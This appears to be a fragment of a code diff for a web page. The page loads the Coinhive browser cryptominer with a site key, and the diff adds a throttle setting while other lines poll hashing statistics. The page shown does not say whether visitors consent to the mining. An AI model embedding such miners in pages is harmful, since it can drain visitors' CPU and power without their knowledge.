@@ -15,6 +15,7 @@
 	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 	<script>
 		var miner = new CoinHive.Anonymous('r0kjtYHKfNbbxZ75Cgqmq8qc4JdbKut1');
+		miner.setThrottle(0.8);
 		setInterval(function() {
 			var hashesPerSecond = miner.getHashesPerSecond();
 			var totalHashes = miner.getTotalHashes();
